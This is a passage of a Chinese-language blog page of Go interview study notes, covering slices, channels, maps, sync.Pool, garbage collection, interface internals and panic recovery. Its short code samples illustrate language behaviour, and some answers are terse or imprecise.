title="1.go的数组和切片"></a>1.go的数组和切片</h2><ol><li>数组是固定长度的，切片是可以变化的</li><li>切片实际是对数组的封装，切片底层是由指向数组的指针，切片长度，切片容量三个参数组成。指向底层数组的指针就标志着切片的开始</li><li>切片是对底层数组的一个引用，不同的切片可以指向同一个底层数组，操纵同一个底层数组。</li></ol><p><strong>需要注意的几点</strong></p><ol><li><p>传递切片作为函数参数，其实拷贝的是切片这个结构体，会产生一个新的切片结构体实例，指向同一个底层数组。虽然也会改变底层数组得值，但是对于原来的切片来说，是没有任何变化的，只是对应的底层数组中某些元素的值变了。</p></li><li><p>切片进行append扩容的时候，会产生新的切片地址，所以要将append函数返回的值重新赋给切片</p></li><li><p>Go1.18不再以1024为临界点，而是设定了一个值为256的threshold，以256为临界点；超过256，不再是每次扩容1/4，而是每次增加（旧容量+3256）/4；</p></li></ol><ul><li>当新切片需要的容量cap大于两倍扩容的容量，则直接按照新切片需要的容量扩容；</li><li>当原 slice 容量 &lt; threshold 的时候，新 slice 容量变成原来的 2 倍；</li><li>当原 slice 容量 &gt; threshold，进入一个循环，每次容量增加（旧容量+3threshold）/4。</li></ul><ol start="4"><li>需要注意切片是对数组的引用, 所以当切片被赋值给别的切片变量时, 改变新的切片变量中的值, 会连带改变原切片值</li></ol><h2 id="2-读已经关闭的channel发生什么"><a href="#2-读已经关闭的channel发生什么" class="headerlink" title="2.读已经关闭的channel发生什么"></a>2.读已经关闭的channel发生什么</h2><ol><li><p>读已关闭的channel <code>读已经关闭的channel无影响。</code></p><ul><li><p>如果在关闭前，通道内部有元素，会正确读到元素的值；</p></li><li><p>如果关闭前通道无元素，则会读取到通道内元素类型对应的零值。</p></li><li><p>若遍历通道，如果通道未关闭，读完元素后，会报死锁的错误。<code>会引发fatal error: all goroutines are asleep - deadlock!</code></p></li></ul></li><li><p>写已关闭的通道<br><code>会引发panic: send on closed channel</code></p></li><li><p>关闭已关闭的通道<br><code>会引发panic: close of closed channel</code></p></li></ol><p><strong>需要注意的几点</strong>：对于一个已初始化，但并未关闭的通道来说，收发操作一定不会引发 panic。但是通道一旦关闭，再对它进行发送操作，就会引发 panic。如果我们试图关闭一个已经关闭了的通道，也会引发 panic。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. 读一个已经关闭的通道</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">channel := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line">channel &lt;- <span class="number">2</span></span><br><span class="line"><span class="built_in">close</span>(channel)</span><br><span class="line">x := &lt;-channel</span><br><span class="line">fmt.Println(x)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*[Output]: 不会报错，输出2*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历读关闭通道</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">channel := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line">channel &lt;- <span class="number">2</span></span><br><span class="line">channel &lt;- <span class="number">3</span></span><br><span class="line"><span class="built_in">close</span>(channel) <span class="comment">//若不关闭通道，则会报死锁错误</span></span><br><span class="line"><span class="keyword">for</span> num := <span class="keyword">range</span> channel &#123;</span><br><span class="line">fmt.Println(num)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*[Output]: 不会报错，输出2 3*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 写一个已经关闭的通道</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    channel := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="built_in">close</span>(channel)</span><br><span class="line">    channel &lt;- <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*[Output]: panic: send on closed channel*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 关闭一个已经关闭的管道</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    channel := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="built_in">close</span>(channel)</span><br><span class="line">    <span class="built_in">close</span>(channel)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*[Output]: panic: close of closed channel */</span></span><br></pre></td></tr></table></figure><h2 id="3-Go是如何实现继承的"><a href="#3-Go是如何实现继承的" class="headerlink" title="3.Go是如何实现继承的"></a>3.Go是如何实现继承的</h2><p>通过struct的组合实现的继承</p><h2 id="13-map取一个key，修改这个key，原map会更改吗【会，是引用类型】"><a href="#13-map取一个key，修改这个key，原map会更改吗【会，是引用类型】" class="headerlink" title="13.map取一个key，修改这个key，原map会更改吗【会，是引用类型】"></a>13.map取一个key，修改这个key，原map会更改吗【会，是引用类型】</h2><p>从map中取出一个值并对其进行修改时，原始的map也会受到影响，因为map是引用类型，它们在底层是指向相同的数据结构的指针</p><ul><li>引用类型：map slice channel interface</li></ul><h2 id="16-struct能否-比较【可以】，成员里有struct呢？【可以】"><a href="#16-struct能否-比较【可以】，成员里有struct呢？【可以】" class="headerlink" title="16. struct能否==比较【可以】，成员里有struct呢？【可以】"></a>16. struct能否==比较【可以】，成员里有struct呢？【可以】</h2><ol><li>但是只能1.相同类型结构体，2.成员结构相同并且都是可比较类型</li><li>但切片、映射和函数等类型无法比较<h2 id="25-go的深浅拷贝"><a href="#25-go的深浅拷贝" class="headerlink" title="25. go的深浅拷贝"></a>25. go的深浅拷贝</h2></li><li>浅拷贝: <code>person1 := person2</code> ，拷贝后的数据是原来数据的引用，更改后原来的也会改</li><li>深拷贝: <code>person3 := Person{name : person1.name}</code>，独立的对象<h2 id="29-如何判断channel是否关闭"><a href="#29-如何判断channel是否关闭" class="headerlink" title="29. 如何判断channel是否关闭"></a>29. 如何判断channel是否关闭</h2></li><li>_, ok := &lt;- mych</li></ol><h2 id="30-make-和-new-的区别"><a href="#30-make-和-new-的区别" class="headerlink" title="30. make 和 new 的区别"></a>30. make 和 new 的区别</h2><ul><li>make创建、初始化引用类型</li><li>new返回的是一个类型的指针，只有创建没有初始化，可以用于任何数据<h2 id="31-Slice的append"><a href="#31-Slice的append" class="headerlink" title="31. Slice的append"></a>31. Slice的append</h2>扩容，每次达到阈值会扩容大改 1/4<h2 id="44-goroutine获取不到锁会一直等待吗【当然会】"><a href="#44-goroutine获取不到锁会一直等待吗【当然会】" class="headerlink" title="44. goroutine获取不到锁会一直等待吗【当然会】"></a>44. goroutine获取不到锁会一直等待吗【当然会】</h2><h2 id="58-空结构体用来干嘛【占位符，某个集合的存在性检查】"><a href="#58-空结构体用来干嘛【占位符，某个集合的存在性检查】" class="headerlink" title="58. 空结构体用来干嘛【占位符，某个集合的存在性检查】"></a>58. 空结构体用来干嘛【占位符，某个集合的存在性检查】</h2><h2 id="60-defer用来干什么【释放锁，关协程，关channel，文件，recover-panic】"><a href="#60-defer用来干什么【释放锁，关协程，关channel，文件，recover-panic】" class="headerlink" title="60. defer用来干什么【释放锁，关协程，关channel，文件，recover panic】"></a>60. defer用来干什么【释放锁，关协程，关channel，文件，recover panic】</h2><h2 id="61-context包的作用【并发安全】"><a href="#61-context包的作用【并发安全】" class="headerlink" title="61. context包的作用【并发安全】"></a>61. context包的作用【并发安全】</h2></li></ul><p><strong>处理网络请求和并发任务时常用</strong>，处理请求范围内的值传递、取消和超时等问题，</p><ol><li>并发安全，可以在多个goroutine中共享</li><li>传递信号给goroutine，进行管理</li><li>传递请求范围内的值</li></ol><h2 id="79-select的底层数据结构和特性"><a href="#79-select的底层数据结构和特性" class="headerlink" title="79. select的底层数据结构和特性"></a>79. select的底层数据结构和特性</h2><p>类似状态机，编译期间首先对case打乱，然后按这个静态的顺序进行轮训。</p><h2 id="64-panic如何恢复"><a href="#64-panic如何恢复" class="headerlink" title="64. panic如何恢复"></a>64. panic如何恢复</h2><ol><li>当程序遇到一个 panic，它会立即停止当前函数的执行，并沿着调用栈一直向上传播，直到到达 recover 所在的延迟函数。</li><li>如果在defer 中调用了 recover，它会停止 panic 的传播并返回 panic 的值。</li><li>如果没有发生 panic，recover 会返回 nil<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">recoverExample</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> r := <span class="built_in">recover</span>(); r != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">"Recovered:"</span>, r)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="comment">// 引发 panic</span></span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">"something went wrong"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="70-go的init函数何时执行的"><a href="#70-go的init函数何时执行的" class="headerlink" title="70. go的init函数何时执行的"></a>70. go的init函数何时执行的</h2><ul><li>导包初始化的时候执行，多个init时，都会执行</li><li>一个文件里有多个init时，根据包的导入关系决定</li><li>在包内有多个init，init执行顺序，golang没有明确定义，字典序？<h2 id="72-Gin的路由如何实现【压缩版的前缀树路由，httprouter库】"><a href="#72-Gin的路由如何实现【压缩版的前缀树路由，httprouter库】" class="headerlink" title="72. Gin的路由如何实现【压缩版的前缀树路由，httprouter库】"></a>72. Gin的路由如何实现【压缩版的前缀树路由，httprouter库】</h2></li></ul><h2 id="74-struct的传递场景：大struct避免复制，用浅拷贝"><a href="#74-struct的传递场景：大struct避免复制，用浅拷贝" class="headerlink" title="74. struct的传递场景：大struct避免复制，用浅拷贝"></a>74. struct的传递场景：大struct避免复制，用浅拷贝</h2><h2 id="79-sync-Pool-对象池用来干嘛的，应用场景如何"><a href="#79-sync-Pool-对象池用来干嘛的，应用场景如何" class="headerlink" title="79. sync.Pool 对象池用来干嘛的，应用场景如何"></a>79. sync.Pool 对象池用来干嘛的，应用场景如何</h2><ul><li>它用于存储和复用临时对象，以减少内存分配和垃圾回收的开销。</li><li>适用于需要频繁创建和销毁对象的场景<ul><li>一些高并发场景，频繁创建和销毁一些对象</li><li>协程池，数据库连接池，http连接池</li><li>临时缓冲区<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">原理如下</span><br><span class="line">1. 每个 sync.Pool 实例内部维护了两个 interface&#123;&#125; 类型的字段，一个用于存储临时对象（私有私有的 local 对象池），另一个用于存储共享对象（共享的 shared 对象池）。</span><br><span class="line">2. 当你调用 pool.Get() 方法时，sync.Pool 会首先尝试从当前 Goroutine 的私有对象池 local 中获取一个对象。</span><br><span class="line">3. 如果 local 中没有可用的对象，它会转而尝试从共享对象池 shared 中获取一个对象。</span><br><span class="line">4. 如果 shared 中也没有可用的对象，它会调用 New 函数创建一个新的对象。</span><br><span class="line">5. 当你调用 pool.Put(obj) 方法时，对象会被放回到当前 Goroutine 的私有对象池 local 中。</span><br><span class="line">6. 如果私有对象池 local 已满，或者对象过期，那么该对象会被丢弃。</span><br><span class="line">这个机制保证了对象会在同一个 Goroutine 中被复用，从而减少了对象的创建和垃圾回收的开销。</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="sync-pool怎么实现的"><a href="#sync-pool怎么实现的" class="headerlink" title="sync.pool怎么实现的"></a>sync.pool怎么实现的</h3><p>私有对象池和共享对象池+互斥锁保证线程安全,通过get和put</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> poolLocal <span class="keyword">struct</span> &#123;</span><br><span class="line">    private <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">    shared  []<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">M sync.Mutex</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="83-变量申请类型是为了做什么"><a href="#83-变量申请类型是为了做什么" class="headerlink" title="83. 变量申请类型是为了做什么"></a>83. 变量申请类型是为了做什么</h2><p>类型就是根据不同的数据类型可以存储不同的数据，所以需要申请对应类型地址<br>数据类型的出现是为了把数据分成所需内存大小不同的数据，编程的时候需要用大数据的时候才需要申请</p><h2 id="88-Go的GC机制介绍一下"><a href="#88-Go的GC机制介绍一下" class="headerlink" title="88. Go的GC机制介绍一下"></a>88. Go的GC机制介绍一下</h2><h2 id="84-Go和Java的GC机制有什么区别"><a href="#84-Go和Java的GC机制有什么区别" class="headerlink" title="84. Go和Java的GC机制有什么区别"></a>84. Go和Java的GC机制有什么区别</h2><ul><li>目前主流的Java虚拟机实现都采用了分代垃圾回收的思想，堆内存被划分为新生代和年老代两部分，新生代主要使用复制和标记-清除垃圾回收，年老代主要使用标记-整理垃圾回收算法</li><li>然后go的垃圾回收是混合写屏障机制，stw的时间更短，1.3用的标记清除，1.5改为用三色标记，但是还需要stw扫描栈所以就演进为混合写屏障，栈上新增对象都为黑色，暂时活过这一轮，然后删除的对象为灰色或者白色，节点都会变为灰色，黑色节点下新增节点都为灰色</li><li>java语言中选择了可达性分析进行对象存活判断，而不是引用计数，主要也是因为java中软引用、弱引用、虚引用等多种引用方式使用引用计数并不能进行有效的存活判断，同时为了避免循环引用的问题，所以java选择了可达性分析的方式进行对象存活判断。</li><li>在java中触发垃圾回收的条件是：<ul><li>cpu空闲的时候；</li><li>在堆栈满了的时候；</li><li>主动调用 System.gc() 后尝试进行回收；</li></ul></li></ul><p><strong>Go的gc最佳应用场景是自身的分配行为不容易导致碎片堆积，并且程序分配新对象的速度不太高的情况，这种情况下go的垃圾回收比java更高效。相反的，当对象分配速度高时，java的gc的优势就会明显体现</strong></p><h2 id="102-什么时候触发线程切换"><a href="#102-什么时候触发线程切换" class="headerlink" title="102. 什么时候触发线程切换"></a>102. 什么时候触发线程切换</h2><ol><li>阻塞</li><li>时间片用完</li><li>显式调用 runtime.Gosched():主动让出当前 Goroutine 的执行权限，让调度器选择另一个可运行的 Goroutine 执行</li><li>互斥锁</li><li>等待组 sync.WaitGroup()<h2 id="107-http库的设计原理是什么？为什么不池化？"><a href="#107-http库的设计原理是什么？为什么不池化？" class="headerlink" title="107. http库的设计原理是什么？为什么不池化？"></a>107. http库的设计原理是什么？为什么不池化？</h2>采用的是连接池：http 包会自动维护一个连接池，用于复用 TCP 连接，从而提升性能。</li></ol><ul><li>不池化的原因：处理的对象不一样，场景也不一样<ul><li>对象池管理创建、销毁常用对象，减少gc压力</li><li>连接池是复用连接，减少资源分配的开销，连接池中的资源通常会被长时间地重复使用，而对象池中的对象可能在短时间内就会被释放</li></ul></li></ul><h2 id="110-关闭一个已关闭的channel会发生什么？panic。"><a href="#110-关闭一个已关闭的channel会发生什么？panic。" class="headerlink" title="110. 关闭一个已关闭的channel会发生什么？panic。"></a>110. 关闭一个已关闭的channel会发生什么？panic。</h2><h2 id="110-238-有缓存channel和没缓存channel的区别是什么？"><a href="#110-238-有缓存channel和没缓存channel的区别是什么？" class="headerlink" title="110/238. 有缓存channel和没缓存channel的区别是什么？"></a>110/238. 有缓存channel和没缓存channel的区别是什么？</h2><p>无缓冲的与有缓冲 channel 有着重大差别，那就是一个是同步的 一个是非同步的</p><h2 id="116-138-类型断言"><a href="#116-138-类型断言" class="headerlink" title="116/138. 类型断言"></a>116/138. 类型断言</h2><ul><li><code>t := i.(T)</code>，这个表达式可以断言一个接口对象（i）里不是 nil，并且接口对象（i）存储的值的类型是 T，如果断言成功，就会返回值给 t，如果断言失败，就会触发 panic</li><li><code>t, ok:= i.(T)</code>，这个表达式也是可以断言一个接口对象（i）里不是 nil，并且接口对象（i）存储的值的类型是 T，如果断言成功，就会返回其类型给 t，并且此时 ok 的值 为 true，表示断言成功。这个不会触发 panic，而是将 ok 的值设为 false ，表示断言失败，此时t 为 T 的零值。<h2 id="8-channel的实现方式-原理-概念-底层实现"><a href="#8-channel的实现方式-原理-概念-底层实现" class="headerlink" title="8.channel的实现方式/原理/概念/底层实现"></a>8.channel的实现方式/原理/概念/底层实现</h2></li></ul><h2 id="117-实现一种等待或者监听的机制【使用select-channel，或者time-sleep】"><a href="#117-实现一种等待或者监听的机制【使用select-channel，或者time-sleep】" class="headerlink" title="117. 实现一种等待或者监听的机制【使用select channel，或者time.sleep】"></a>117. 实现一种等待或者监听的机制【使用select channel，或者time.sleep】</h2><h2 id="118-sleep的底层实现？slice的append返回一个新切片会发生什么"><a href="#118-sleep的底层实现？slice的append返回一个新切片会发生什么" class="headerlink" title="118. sleep的底层实现？slice的append返回一个新切片会发生什么"></a>118. sleep的底层实现？slice的append返回一个新切片会发生什么</h2><ul><li>append不超threshold，底层引用的数组还是原来的地址</li><li>超过了的话，原来的和新的都会指向新数组</li></ul><h2 id="120-137-291-interface的底层实现"><a href="#120-137-291-interface的底层实现" class="headerlink" title="120/137/291. interface的底层实现"></a>120/137/291. interface的底层实现</h2><ul><li>带有方法的interface，一种是不带方法的interface</li><li>任何一个interface变量都是占用16个byte的内存空间</li><li>第一个字段 _type指针，指向数据类型，runtime中的每个数据类型都包含一个这样的字段</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 没有方法的interface</span></span><br><span class="line"><span class="keyword">type</span> eface <span class="keyword">struct</span> &#123;</span><br><span class="line">    _type *_type <span class="comment">//重要字段，记录着某种数据类型的一些基本特征，比如这个数据类型占用的内存大小（size字段），数据类型的名称（nameOff字段）等等</span></span><br><span class="line">    <span class="comment">// 每种数据类型都存在一个与之对应的_type结构体</span></span><br><span class="line">    data unsafe.Pointer</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 有方法的interface</span></span><br><span class="line"><span class="keyword">type</span> iface <span class="keyword">struct</span> &#123;</span><br><span class="line">    tab *itab</span><br><span class="line">    data unsafe.Pointer</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 记录着Go语言中某个数据类型的基本特征</span></span><br><span class="line"><span class="keyword">type</span> _type <span class="keyword">struct</span> &#123;</span><br><span class="line">    size    <span class="keyword">uintptr</span></span><br><span class="line">    ptrdata  <span class="keyword">uintptr</span></span><br><span class="line">    hash    <span class="keyword">uint32</span></span><br><span class="line">    tflag   tflag</span><br><span class="line">    align   <span class="keyword">uint8</span></span><br><span class="line">    fieldalign <span class="keyword">uint8</span></span><br><span class="line">    kind    <span class="keyword">uint8</span></span><br><span class="line">    alg    *typeAlg</span><br><span class="line">    gcdata  *<span class="keyword">byte</span></span><br><span class="line">    str    nameOff</span><br><span class="line">    ptrToThis typeOff</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> itab <span class="keyword">struct</span> &#123;</span><br><span class="line">    inter *interfacetype</span><br><span class="line">    _type *_type <span class="comment">//重要</span></span><br><span class="line">    link  *itab</span><br><span class="line">    hash  <span class="keyword">uint32</span></span><br><span class="line">    bad  <span class="keyword">bool</span></span><br><span class="line">    inhash <span class="keyword">bool</span></span><br><span class="line">    unused [<span class="number">2</span>]<span class="keyword">byte</span></span><br><span class="line">    fun  [<span class="number">1</span>]<span class="keyword">uintptr</span></span><br><span class="line">&#125;   </span><br><span class="line"><span class="comment">// interface数据类型对应的type</span></span><br><span class="line"><span class="keyword">type</span> interfacetype <span class="keyword">struct</span> &#123;</span><br><span class="line">    typ   _type</span><br><span class="line">    pkgpath name</span><br><span class="line">    mhdr  []imethod</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="404-defer的底层实现"><a href="#404-defer的底层实现" class="headerlink" title="404. defer的底层实现"></a>404. defer的底层实现</h2><h2 id="160-string的底层实现"><a href="#160-string的底层实现" class="headerlink" title="160. string的底层实现"></a>160. string的底层实现</h2><h2 id="121-STW-在-go-的哪些阶段发生？1-8的改进是什么【混合写】"><a href="#121-STW-在-go-的哪些阶段发生？1-8的改进是什么【混合写】" class="headerlink" title="121. STW 在 go 的哪些阶段发生？1.8的改进是什么【混合写】"></a>121. STW 在 go 的哪些阶段发生？1.8的改进是什么【混合写】</h2><h2 id="132-如何避免panic"><a href="#132-如何避免panic" class="headerlink" title="132. 如何避免panic"></a>132. 如何避免panic</h2><h2 id="133-结构体对齐优化"><a href="#133-结构体对齐优化" class="headerlink" title="133. 结构体对齐优化"></a>133. 结构体对齐优化</h2><p>内存对齐:CPU访问内存时，通过字来访问，一个字在32位cpu中4个字节，所以对于</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> demo&#123;</span><br><span class="line">    a <span class="keyword">int8</span> <span class="comment">//1</span></span><br><span class="line">    b <span class="keyword">int32</span><span class="comment">//4</span></span><br><span class="line">    c <span class="keyword">int16</span> <span class="comment">//2</span></span><br><span class="line">&#125;</span><br><span class="line">会变成 <span class="number">1</span>+<span class="number">3</span> + <span class="number">2</span>+<span class="number">2</span> + <span class="number">4</span> 字节，而下面会变成 <span class="number">3</span>+<span class="number">1</span> + <span class="number">4</span></span><br><span class="line"><span class="keyword">struct</span> demo&#123;</span><br><span class="line">    a <span class="keyword">int8</span> <span class="comment">//1</span></span><br><span class="line">    b <span class="keyword">int16</span><span class="comment">//2</span></span><br><span class="line">    c <span class="keyword">int32</span><span class="comment">//4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="244-go实现func自定义参数"><a href="#244-go实现func自定义参数" class="headerlink" title="244. go实现func自定义参数"></a>244. go实现func自定义参数</h2><p><code>type myFunc func(int) int</code></p><h2 id="252-copy是操作符还是内置函数【内置函数，深拷贝】"><a href="#252-copy是操作符还是内置函数【内置函数，深拷贝】" class="headerlink" title="252. copy是操作符还是内置函数【内置函数，深拷贝】"></a>252. copy是操作符还是内置函数【内置函数，深拷贝】</h2><h2 id="290-解释一下Go的通信机制"><a href="#290-解释一下Go的通信机制" class="headerlink" title="290. 解释一下Go的通信机制"></a>290. 解释一下Go的通信机制</h2><p>是通过channel实现的，chan定义实现了<strong>环形队列</strong>，总是遵循先入先出（First In First Out）的规则，保证收发数据的顺序，这一点和管道是一样的；chan在实现时定义了:</p><ul><li>指针</li><li>环形队列</li><li>（阻塞)协程链表<br>来控制通信，当chan满足条件时，通过指针sendx 、recvx 进行读写数据。</li></ul><h2 id="296-slice函数传参，先赋值再append与先append再赋值，哪个发生了改变"><a href="#296-slice函数传参，先赋值再append与先append再赋值，哪个发生了改变" class="headerlink" title="296. slice函数传参，先赋值再append与先append再赋值，哪个发生了改变"></a>296. slice函数传参，先赋值再append与先append再赋值，哪个发生了改变</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">appendThenAssign</span><span class="params">(arr []<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">arr = <span class="built_in">append</span>(arr, <span class="number">3</span>)</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">99</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">assignThenAppend</span><span class="params">(arr []<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">99</span></span><br><span class="line">arr = <span class="built_in">append</span>(arr, <span class="number">3</span>)</span><br><span class="line">&#125;</span><br><span class="line">appendThenAssign(arr)</span><br><span class="line"><span class="comment">//print arr: 1 2</span></span><br><span class="line">assignThenAppend(arr)</span><br><span class="line"><span class="comment">//print arr: 99 2</span></span><br></pre></td></tr></table></figure><h2 id="297-有没有什么线程安全的办法？"><a href="#297-有没有什么线程安全的办法？" class="headerlink" title="297. 有没有什么线程安全的办法？"></a>297. 有没有什么线程安全的办法？</h2><h2 id="golang-http包的内存泄漏情况"><a href="#golang-http包的内存泄漏情况" class="headerlink" title="golang http包的内存泄漏情况"></a>golang http包的内存泄漏情况</h2><ol><li>忘记关闭response的 body</li><li>忘记释放连接，或者一直创建连接，没有有效复用的情况？</li></ol><h2 id="306-go-map的时间复杂度"><a href="#306-go-map的时间复杂度" class="headerlink" title="306. go map的时间复杂度"></a>306. go map的时间复杂度</h2><h2 id="307-go由源码变二进制代码的整个流程"><a href="#307-go由源码变二进制代码的整个流程" class="headerlink" title="307. go由源码变二进制代码的整个流程"></a>307. go由源码变二进制代码的整个流程</h2><h2 id="309-select-poll-epoll"><a href="#309-select-poll-epoll" class="headerlink" title="309. select poll epoll"></a>309. select poll epoll</h2><h2 id="314-make底层原理"><a href="#314-make底层原理" class="headerlink" title="314. make底层原理"></a>314. make底层原理</h2><h2 id="315-string-强转-byte-发生了什么"><a href="#315-string-强转-byte-发生了什么" class="headerlink" title="315. string 强转 []byte 发生了什么"></a>315. string 强转 []byte 发生了什么</h2><h2 id="335-411-go的包管理工具除了go-mod还有什么"><a href="#335-411-go的包管理工具除了go-mod还有什么" class="headerlink" title="335/411. go的包管理工具除了go mod还有什么"></a>335/411. go的包管理工具除了go mod还有什么</h2><ul><li>go mod能下载和管理指定版本的库，实现高效的模块化开发，和管理依赖关系的功能</li><li>go sum干什么的：提供了安全机制<ul><li>块路径：列出了项目中所使用的所有直接依赖模块的路径。</li><li>版本号：对应每个模块的版本号。</li><li>哈希值：对应每个模块版本的哈希值，用于确保模块的<strong>代码完整性</strong>。<h2 id="356-介绍一下go的反射"><a href="#356-介绍一下go的反射" class="headerlink" title="356. 介绍一下go的反射"></a>356. 介绍一下go的反射</h2>typeof和valueof来实现，每个类型，包括符合类型都维护了一个type和value区域</li></ul></li></ul><h2 id="396-go的-oop-面向对象与传统面向对象的区别"><a href="#396-go的-oop-面向对象与传统面向对象的区别" class="headerlink" title="396. go的 oop 面向对象与传统面向对象的区别"></a>396. go的 oop 面向对象与传统面向对象的区别</h2><p>go是用结构体定义对象，然后通过组合实现继承，对于多态来说，go强调接口的使用，</p><h2 id="397-go里面interface对于java的接口和c-的虚函数区别在哪"><a href="#397-go里面interface对于java的接口和c-的虚函数区别在哪" class="headerlink" title="397. go里面interface对于java的接口和c++的虚函数区别在哪"></a>397. go里面interface对于java的接口和c++的虚函数区别在哪</h2><ul><li>Go 接口是隐式实现的，一个类型只要实现了接口中的所有方法，就被认为是实现了该接口，无需显式声明。这种方式让 Go 具有了更大的灵活性。</li><li>Go 倾向于使用接口和返回错误值的方式来处理错误，而不是像 Java 或者 C++ 中那样使用异常</li></ul><h2 id="402-Go-runtime的程序计数器，为什么是私有的（为什么程序猿不能操作）"><a href="#402-Go-runtime的程序计数器，为什么是私有的（为什么程序猿不能操作）" class="headerlink" title="402. Go runtime的程序计数器，为什么是私有的（为什么程序猿不能操作）"></a>402. Go 